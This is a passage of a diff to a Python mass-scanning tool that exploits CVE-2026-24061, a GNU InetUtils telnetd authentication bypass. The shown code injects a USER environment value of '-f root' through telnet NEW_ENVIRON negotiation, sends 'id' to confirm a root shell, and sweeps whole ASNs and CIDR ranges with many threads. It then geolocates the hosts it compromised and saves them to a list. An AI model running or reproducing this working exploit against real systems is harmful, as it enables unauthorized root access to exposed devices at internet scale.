+        with socket.create_connection((host, port), timeout=config.connect_timeout) as sock:
+            sock.settimeout(config.read_timeout)
+            negotiator = TelnetNegotiator(sock, config.user_value, logger)
+            negotiator.send_cmd(WILL, NEW_ENVIRON)
+            negotiator.send_cmd(WILL, ENVIRON)
+            text = negotiator.read_text(config.read_timeout)
+            if not negotiator.send_requested(NEW_ENVIRON):
+                text += negotiator.read_text(0.3)
+            if not negotiator.env_sent(NEW_ENVIRON):
+                negotiator.send_env(NEW_ENVIRON)
+            text += negotiator.read_text(config.read_timeout)
+            if has_login_prompt(text):
+                result.evidence = "login prompt"
+                return result
+            sock.sendall(b"\r\n")
+            text += negotiator.read_text(config.read_timeout)
+            if has_login_prompt(text):
+                result.evidence = "login prompt"
+                return result
+            sock.sendall(b"id\r\n")
+            id_text = negotiator.read_text(config.id_timeout)
+            if has_login_prompt(text + id_text):
+                result.evidence = "login prompt"
+                return result
+            if has_root_id(id_text):
+                result.vulnerable = True
+                result.evidence = "uid=0/gid=0"
+            return result
+    except (socket.timeout, ConnectionRefusedError) as exc:
+        result.error = str(exc)
+        return result
+    except OSError as exc:
+        result.error = str(exc)
+        return result
+
+def enrich_with_ipapi(result: ScanResult, logger: logging.Logger) -> ScanResult:
+    if not result.host or result.host == "0.0.0.0":
+        result.asn = result.asn or "N/A"
+        result.provider = result.provider or "N/A"
+        result.location = result.location or "N/A"
+        return result
+    try:
+        asn_val, provider, location = query_ipapi(result.host, logger)
+        result.asn = asn_val or result.asn or "N/A"
+        result.provider = provider or result.provider or "N/A"
+        result.location = location or result.location or "N/A"
+    except Exception:
+        result.asn = result.asn or "N/A"
+        result.provider = result.provider or "N/A"
+        result.location = result.location or "N/A"
+    return result
 
 def scan_with_basic_compact(
     endpoints: List[Tuple[str, int]],
@@ -766,19 +740,15 @@ def scan_with_basic_compact(
     args: argparse.Namespace,
     vulnerable: List[ScanResult]
 ) -> Tuple[bool, int]:
-    """Scan with basic compact display. Returns (completed_successfully, scanned_count)."""
-
     completed = 0
     start_time = time.time()
     total = len(endpoints)
     interrupted = False
     last_time_update = time.time()
     time_interval = 0.5
-
     last_vuln_host = None
     last_vuln_port = None
     last_vuln_time = None
-
     print(create_compact_header(
         asn=args.asn if hasattr(args, 'asn') and args.asn else None,
         targets=len(set(h for h, p in endpoints)),
@@ -786,201 +756,108 @@ def scan_with_basic_compact(
         threads=args.threads
     ))
     print()
-
     box_lines = 12
-
-    print(create_combined_progress_box(0, total, 0, 0, 0))
-
-    executor = concurrent.futures.ThreadPoolExecutor(
-        max_workers=args.threads,
-        thread_name_prefix="scanner"
-    )
-
+    print(create_combined_progress_box(0, total, 0.0, 0.0, 0))
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads, thread_name_prefix="scanner")
     for thread in threading.enumerate():
         if thread.name.startswith("scanner"):
             thread.daemon = True
-
     try:
-        futures = {
-            executor.submit(scan_target, host, port, config, logger): (host, port)
-            for host, port in endpoints
-        }
-
+        futures = {executor.submit(scan_target, host, port, config, logger): (host, port) for host, port in endpoints}
         for future in concurrent.futures.as_completed(futures):
             try:
                 result = future.result()
                 completed += 1
                 current_time = time.time()
-
                 elapsed = current_time - start_time
-                rate = completed / elapsed if elapsed > 0 else 0
-                eta = (total - completed) / rate if rate > 0 else 0
-
+                rate = completed / elapsed if elapsed > 0 else 0.0
+                eta = (total - completed) / rate if rate > 0 else 0.0
                 if result.vulnerable:
+                    result = enrich_with_ipapi(result, logger)
                     vulnerable.append(result)
                     last_vuln_host = result.host
                     last_vuln_port = result.port
                     last_vuln_time = time.strftime("%H:%M:%S")
-
                     sys.stdout.write(f"\033[{box_lines}A")
-                    print(create_combined_progress_box(
-                        completed, total, rate, eta, len(vulnerable),
-                        last_vuln_host, last_vuln_port, last_vuln_time
-                    ))
+                    print(create_combined_progress_box(completed, total, rate, eta, len(vulnerable), last_vuln_host, last_vuln_port, last_vuln_time))
                     sys.stdout.flush()
                     last_time_update = current_time
                     continue
-
                 if current_time - last_time_update >= time_interval or completed == total:
                     sys.stdout.write(f"\033[{box_lines}A")
-                    print(create_combined_progress_box(
-                        completed, total, rate, eta, len(vulnerable),
-                        last_vuln_host, last_vuln_port, last_vuln_time
-                    ))
+                    print(create_combined_progress_box(completed, total, rate, eta, len(vulnerable), last_vuln_host, last_vuln_port, last_vuln_time))
                     sys.stdout.flush()
                     last_time_update = current_time
-
             except Exception as exc:
                 logger.debug("Error Processing Result: %s", exc)
-
     except KeyboardInterrupt:
         interrupted = True
-
         sys.stderr.write("\r\033[K")
         sys.stderr.flush()
-        print("\n")
-        logger.info("Scanning Interrupted by User (CTRL+C)")
-
+        sys.stderr.write("\n")
+        sys.stderr.flush()
+        logger.warning("Scanning Interrupted by User (CTRL+C)")
     finally:
         executor.shutdown(wait=False, cancel_futures=True)
-
     print()
-
     return (not interrupted, completed)
 
-def parse_args(argv: Sequence[str]) -> argparse.Namespace:
-    parser = argparse.ArgumentParser(
-        prog="python3 twenty-three-scanner.py",
-        description="CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  # Scan Specific ASN with Multiple Ports
-  %(prog)s -a AS10111 -p 23,2323 --threads 100
-  %(prog)s -a 10111 -p 23,2323 --threads 100
+def read_targets_file(path: str) -> List[str]:
+    tokens: List[str] = []
+    with open(path, "r", encoding="utf-8") as handle:
+        for line in handle:
+            line = line.split("#", 1)[0].strip()
+            if not line:
+                continue
+            tokens.extend(split_target_tokens(line))
+    return tokens
 
-  # Scan CIDR Range
-  %(prog)s -t 192.168.23.0/24 -p 23 -o results.txt
-
-  # Scan Multiple IPs with Multiple Ports
-  %(prog)s -t 10.0.0.1,10.0.0.2,10.0.0.3 -p 23,2323
-
-  # Scan Single IP, IPs, and CIDR Range from File
-  %(prog)s -f targets.txt -p 23 --threads 50 -o output.txt
-
-  # Scan Specific ASN with Custom Limits
-  %(prog)s -a AS10111 --max-hosts-per-cidr 2048 --threads 200
-
-For more information: https://github.com/madfxr/Twenty-Three-Scanner
-        """
-    )
-
-    target_group = parser.add_argument_group('Target Options')
-    target_group.add_argument(
-        "-t", "--target",
-        action="append",
-        metavar="TARGET",
-        help="target IP, CIDR, or comma-separated list (can be used multiple times)"
-    )
-    target_group.add_argument(
-        "-f", "--file",
-        metavar="FILE",
-        help="file containing targets (one per line, supports comments with #)"
-    )
-    target_group.add_argument(
-        "-a", "--asn",
-        metavar="ASN",
-        help="autonomous system number (e.g., AS10111 or 10111)"
-    )
-
-    scan_group = parser.add_argument_group('Scan Options')
-    scan_group.add_argument(
-        "-p", "--port",
-        default="23",
-        metavar="PORT",
-        help="target port(s), comma-separated (default: 23)"
-    )
-    scan_group.add_argument(
-        "--threads",
-        type=int,
-        default=50,
-        metavar="N",
-        help="number of concurrent threads (default: 50)"
-    )
-    scan_group.add_argument(
-        "--user-value",
-        default="-f root",
-        metavar="VALUE",
-        help="USER environment variable value for exploit (default: '-f root')"
-    )
-
-    timeout_group = parser.add_argument_group('Timeout Options')
-    timeout_group.add_argument(
-        "--connect-timeout",
-        type=float,
-        default=3.0,
-        metavar="SEC",
-        help="TCP connection timeout in seconds (default: 3.0)"
-    )
-    timeout_group.add_argument(
-        "--read-timeout",
-        type=float,
-        default=2.0,
-        metavar="SEC",
-        help="socket read timeout in seconds (default: 2.0)"
-    )
-    timeout_group.add_argument(
-        "--id-timeout",
-        type=float,
-        default=2.0,
-        metavar="SEC",
-        help="'id' command response timeout in seconds (default: 2.0)"
-    )
-
-    limit_group = parser.add_argument_group('Limit Options')
-    limit_group.add_argument(
-        "--max-hosts-per-cidr",
-        type=int,
-        default=1024,
-        metavar="N",
-        help="maximum hosts to scan per CIDR block (default: 1024)"
-    )
-    limit_group.add_argument(
-        "--max-total-hosts",
-        type=int,
-        default=50000,
-        metavar="N",
-        help="maximum total hosts across all targets (default: 50000)"
-    )
-    limit_group.add_argument(
-        "--skip-large-networks",
-        action="store_true",
-        help="skip networks larger than /16 (avoids accidentally scanning huge ranges)"
-    )
-
-    output_group = parser.add_argument_group('Output Options')
-    output_group.add_argument(
-        "-o", "--output",
-        metavar="FILE",
-        help="save vulnerable hosts to file (format: IP:PORT)"
-    )
-    output_group.add_argument(
-        "-v", "--verbose",
-        action="store_true",
-        help="enable verbose debug logging"
-    )
-
-    return parser.parse_args(argv)
+def expand_targets(raw_tokens: Sequence[str], logger: logging.Logger, max_hosts_per_cidr: int = 1024, skip_large: bool = False) -> List[str]:
+    targets: List[str] = []
+    seen: Set[str] = set()
+    total_skipped = 0
+    large_networks_skipped = 0
+    for token in raw_tokens:
+        if "/" in token:
+            try:
+                network = ipaddress.ip_network(token, strict=False)
+            except ValueError:
+                logger.warning("Skipping Invalid CIDR: %s", token)
+                continue
+            if skip_large and network.prefixlen < 16:
+                logger.warning("Skipping Large Network: %s", token)
+                large_networks_skipped += 1
+                continue
+            num_hosts = network.num_addresses
+            if network.version == 4:
+                num_hosts -= 2
+            if num_hosts > max_hosts_per_cidr:
+                logger.warning("CIDR %s Has %d Hosts, Limiting to %d", token, num_hosts, max_hosts_per_cidr)
+                total_skipped += (num_hosts - max_hosts_per_cidr)
+            count = 0
+            for ip in network.hosts():
+                if count >= max_hosts_per_cidr:
+                    break
+                ip_str = str(ip)
+                if ip_str not in seen:
+                    seen.add(ip_str)
+                    targets.append(ip_str)
+                    count += 1
+            continue
+        try:
+            ip = ipaddress.ip_address(token)
+        except ValueError:
+            logger.warning("Skipping Invalid Target: %s", token)
+            continue
+        ip_str = str(ip)
+        if ip_str not in seen:
+            seen.add(ip_str)
+            targets.append(ip_str)
+    if total_skipped > 0:
+        logger.warning("Limited %d Hosts Due to CIDR Size Limits", total_skipped)
+    if large_networks_skipped > 0:
+        logger.warning("Skipped %d Large Networks", large_networks_skipped)
+    return targets
 
 def build_endpoints(targets: Sequence[str], ports: Sequence[int]) -> List[Tuple[str, int]]:
     endpoints: List[Tuple[str, int]] = []
@@ -989,13 +866,40 @@ def build_endpoints(targets: Sequence[str], ports: Sequence[int]) -> List[Tuple[
             endpoints.append((host, port))
     return endpoints
 
+def parse_args(argv: Sequence[str]) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(prog="python3 twenty-three-scanner.py", description="CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass", formatter_class=argparse.RawDescriptionHelpFormatter)
+    target_group = parser.add_argument_group('Target Options')
+    target_group.add_argument("-t", "--target", action="append", metavar="TARGET", help="target IP, CIDR, or comma-separated list (can be used multiple times)")
+    target_group.add_argument("-f", "--file", metavar="FILE", help="file containing targets (one per line, supports comments with #)")
+    target_group.add_argument("-a", "--asn", metavar="ASN", help="autonomous system number (e.g., AS10111 or 10111)")
+    scan_group = parser.add_argument_group('Scan Options')
+    scan_group.add_argument("-p", "--port", default="23", metavar="PORT", help="target port(s), comma-separated (default: 23)")
+    scan_group.add_argument("--threads", type=int, default=50, metavar="N", help="number of concurrent threads (default: 50)")
+    scan_group.add_argument("--user-value", default="-f root", metavar="VALUE", help="USER environment variable value for exploit (default: '-f root')")
+    timeout_group = parser.add_argument_group('Timeout Options')
+    timeout_group.add_argument("--connect-timeout", type=float, default=3.0, metavar="SEC", help="TCP connection timeout in seconds (default: 3.0)")
+    timeout_group.add_argument("--read-timeout", type=float, default=2.0, metavar="SEC", help="socket read timeout in seconds (default: 2.0)")
+    timeout_group.add_argument("--id-timeout", type=float, default=2.0, metavar="SEC", help="'id' command response timeout in seconds (default: 2.0)")
+    limit_group = parser.add_argument_group('Limit Options')
+    limit_group.add_argument("--max-hosts-per-cidr", type=int, default=1024, metavar="N", help="maximum hosts to scan per CIDR block (default: 1024)")
+    limit_group.add_argument("--max-total-hosts", type=int, default=50000, metavar="N", help="maximum total hosts across all targets (default: 50000)")
+    limit_group.add_argument("--skip-large-networks", action="store_true", help="skip networks larger than /16 (avoids accidentally scanning huge ranges)")
+    output_group = parser.add_argument_group('Output Options')
+    output_group.add_argument("-o", "--output", metavar="FILE", help="save vulnerable hosts to file (format: IP:PORT)")
+    output_group.add_argument("-v", "--verbose", action="store_true", help="enable verbose debug logging")
+    return parser.parse_args(argv)
+
 def main(argv: Sequence[str]) -> int:
     args = parse_args(argv)
     logger = setup_logging(args.verbose)
-
     import signal
     ctrl_c_count = [0]
-
+    interrupt_warned = [False]
+    interrupt_handler = logging.StreamHandler(sys.stderr)
+    interrupt_handler.setFormatter(ColoredFormatter(fmt='%(asctime)s %(levelname)s %(message)s', datefmt='%H:%M:%S'))
+    temp_logger = logging.getLogger('interrupt')
+    temp_logger.setLevel(logging.WARNING)
+    temp_logger.handlers = [interrupt_handler]
     def handle_interrupt(sig, frame):
         ctrl_c_count[0] += 1
         if ctrl_c_count[0] == 1:
@@ -1003,107 +907,82 @@ def main(argv: Sequence[str]) -> int:
         else:
             sys.stderr.write("\r\033[K")
             sys.stderr.flush()
-
-            handler = logging.StreamHandler(sys.stderr)
-            formatter = ColoredFormatter(
-                fmt='%(asctime)s %(levelname)s %(message)s',
-                datefmt='%H:%M:%S'
-            )
-            handler.setFormatter(formatter)
-
-            temp_logger = logging.getLogger('interrupt')
-            temp_logger.setLevel(logging.WARNING)
-            temp_logger.handlers = [handler]
-            temp_logger.warning("Scanning Force Interrupted by User (CTRL+C)")
-
+            if not interrupt_warned[0]:
+                temp_logger.warning("Scanning Force Interrupted by User (CTRL+C)")
+                interrupt_warned[0] = True
     signal.signal(signal.SIGINT, handle_interrupt)
-
     logger.warning("Using Basic Display Mode")
-
+    prefixes_from_summary: List[str] = []
+    raw_asn = None
+    if getattr(args, "asn", None):
+        raw_asn = args.asn
+        prefixes_from_summary = summarize_ipapi_for_asn(raw_asn, logger, max_prefixes=8)
+    else:
+        summarize_targets_ipapi_from_args(args, logger, sample_limit=4)
     try:
         ports = parse_ports(args.port)
     except argparse.ArgumentTypeError as exc:
-        error_msg = str(exc)
         timestamp = time.strftime("%H:%M:%S")
-        sys.stderr.write(f"{timestamp} \033[91mERROR\033[0m {error_msg}\n")
+        sys.stderr.write(f"{timestamp} \033[91mERROR\033[0m {exc}\n")
         sys.stderr.flush()
         return 2
-
     logger.info("Parsed Ports: %s", ",".join(map(str, ports)))
-
     raw_tokens: List[str] = []
-
-    if args.asn:
-        logger.info("Fetching Prefixes for ASN: %s", args.asn)
-        asn_prefixes = fetch_asn_prefixes(args.asn, logger)
+    if raw_asn:
+        logger.info("Fetching Prefixes for ASN: %s", raw_asn)
+        if prefixes_from_summary:
+            asn_prefixes = prefixes_from_summary
+        else:
+            normalized = raw_asn.upper().strip()
+            asn_for_query = normalized[2:] if normalized.startswith("AS") else normalized
+            asn_prefixes, counts = fetch_asn_prefixes(asn_for_query, logger, raw_asn)
         if not asn_prefixes:
-            logger.error("Not Found Prefixes for ASN: %s", args.asn)
+            logger.error("Not Found Prefixes for ASN: %s", raw_asn)
             return 2
-        logger.info("Found %d Prefixes for %s", len(asn_prefixes), args.asn)
+        #logger.info("Found %d Prefixes for %s", len(asn_prefixes), raw_asn)
         raw_tokens.extend(asn_prefixes)
-
     if args.target:
         for value in args.target:
             raw_tokens.extend(split_target_tokens(value))
-
     if args.file:
         try:
             raw_tokens.extend(read_targets_file(args.file))
         except OSError as exc:
-            logger.error("Failed to Read Targets File: %s", exc)
+            logger.error("Cannot Read Targets File: %s", exc)
             return 2
-
     if not raw_tokens:
         logger.error("No Targets Specified. Use --target, --file, or --asn.")
         return 2
-
-    logger.info("Expanding %d Target Token(s)", len(raw_tokens))
-    targets = expand_targets(
-        raw_tokens,
-        logger,
-        max_hosts_per_cidr=args.max_hosts_per_cidr,
-        skip_large=args.skip_large_networks
-    )
-
+    #logger.info("Expanding %d Target Token(s)", len(raw_tokens))
+    targets = expand_targets(raw_tokens, logger, max_hosts_per_cidr=args.max_hosts_per_cidr, skip_large=args.skip_large_networks)
     if not targets:
         logger.error("No Valid Targets After Expansion")
         return 2
-
     if len(targets) > args.max_total_hosts:
         logger.warning("Limiting to First %d Hosts", args.max_total_hosts)
         targets = targets[:args.max_total_hosts]
-
     endpoints = build_endpoints(targets, ports)
     logger.info("Ready to Scan %d Endpoint(s)\n", len(endpoints))
-
-    config = ScanConfig(
-        connect_timeout=args.connect_timeout,
-        read_timeout=args.read_timeout,
-        id_timeout=args.id_timeout,
-        user_value=args.user_value,
-    )
-
+    config = ScanConfig(connect_timeout=args.connect_timeout, read_timeout=args.read_timeout, id_timeout=args.id_timeout, user_value=args.user_value)
     vulnerable: List[ScanResult] = []
     start_time = time.time()
-
     try:
         completed_successfully, scanned_count = scan_with_basic_compact(endpoints, config, logger, args, vulnerable)
     except KeyboardInterrupt:
-        sys.stderr.write("\r\033[K")
-        sys.stderr.flush()
-        logger.warning("Force Exit During Cleanup")
+        logger.warning("Scanning Interrupted by User (CTRL+C)")
         return 130
-
     elapsed = time.time() - start_time
-
+    if vulnerable:
+        for res in vulnerable:
+            if (not res.asn or res.asn == "N/A") or (not res.provider or res.provider == "N/A") or (not res.location or res.location == "N/A"):
+                enrich_with_ipapi(res, logger)
+                time.sleep(0.02)
     try:
         print(create_final_compact_table(vulnerable, elapsed, len(endpoints), scanned_count, not completed_successfully))
         print()
     except KeyboardInterrupt:
-        sys.stderr.write("\r\033[K")
-        sys.stderr.flush()
+        logger.warning("Scanning Interrupted by User (CTRL+C)")
         return 130
-
     if args.output and vulnerable:
         try:
             with open(args.output, 'w', encoding='utf-8') as f:
@@ -1119,23 +998,18 @@ def main(argv: Sequence[str]) -> int:
                     f.write(f"{result.host}:{result.port}\n")
             logger.info("Results Saved to: %s", args.output)
         except KeyboardInterrupt:
-            sys.stderr.write("\r\033[K")
-            sys.stderr.flush()
             logger.warning("Output Interrupted")
             return 130
         except OSError as exc:
             logger.error("Failed to Save Results: %s", exc)
-
     if not completed_successfully:
         return 130
-
     return 0
 
 if __name__ == "__main__":
     try:
         sys.exit(main(sys.argv[1:]))
     except KeyboardInterrupt:
-        sys.stderr.write("\r\033[K")
-        sys.stderr.flush()
-        print("\nInterrupted by User")
+        logger = setup_logging(False)
+        logger.warning("Scanning Interrupted by User (CTRL+C)")
         sys.exit(130)
